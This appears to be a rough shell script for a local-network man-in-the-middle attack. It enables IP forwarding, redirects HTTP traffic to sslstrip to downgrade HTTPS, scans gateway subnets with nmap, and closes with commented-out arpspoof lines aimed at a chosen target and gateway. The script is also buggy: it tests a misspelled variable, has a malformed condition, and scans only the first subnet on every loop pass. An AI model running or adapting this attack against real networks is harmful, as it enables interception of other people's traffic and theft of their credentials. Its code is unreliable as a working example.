echo Strip HTTPS to HTTP 
echo have fun! 
echo Enable IP fowarder
echo 1 > /proc/sys/net/ipv4/ip_forward
echo enabling port forwarding from a certain port to another port
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 
iptables -t nat -L PREROUTING  
sslstrip -h



#stopped at 8:16:68
echo the default gateway info is listed below
route
route > gateway.txt
GTCNT=$(wc -l gateway.txt | gawk '{print $1}')
echo the Gateway count is $GTCNT
if [ $GRCNT==2 ]; then
	echo Setting the gateway to a default value:
	echo 192.168.0.0 > gatewayIP.txt
else 
	gawk '{print $1}' gateway.txt > gatewayIP.txt
fi
grep '[0-9]' gatewayIP.txt > gatewayIPNum.txt
echo The list of only IP address in the route is as follows:
cat gatewayIPNum.txt 
sed -e 's/$/-254/' gatewayIPNum.txt > gatewayIPsubnet.txt
SUBCNT=$(wc -l gatewayIPsubnet.txt | gawk '{print $1}')
echo the Subnet count is $SUBCNT
echo The list of subnet ranges is as follows:
cat gatewayIPsubnet.txt
COUNTER=1
p=p
let SUBCNT=SUBCNT+1
TEMP=0
while [ $COUNTER -lt $SUBCNT ]; do
	echo $COUNTER :
	NMAPADD=$(sed -n 1p gatewayIPsubnet.txt)
	echo you are about to Nmap $NMAPADD range:
	nmap $NMAPADD -vv
	let COUNTER=COUNTER+1
done
	

sleep 7

echo ARP Spoofing attacl
echo Syntax: arpspoof -i interface -t target-ip target-gateway-ip
echo Place enter the target-ip 
#read $targetIP
echo ""
echo Please enter the targetGatewayIP
#read $targetGate
#arpspoof -i eth0 -t $targetIP $targetGate

